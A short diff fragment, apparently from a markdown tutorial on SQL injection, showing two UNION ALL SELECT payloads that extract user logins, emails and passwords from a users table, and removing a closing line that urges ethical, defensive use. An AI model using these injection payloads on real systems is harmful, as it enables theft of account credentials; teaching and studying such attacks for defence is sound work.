@@ -13,5 +13,3 @@ a" UNION ALL SELECT user_login,user_pass from my_users; --
 
 a" UNION ALL SELECT user_email,user_pass from my_users; -- 
 ```
-
-And I think it goes without saying, use this knowledge for learning how to protect yourself, and for the greater good ;)
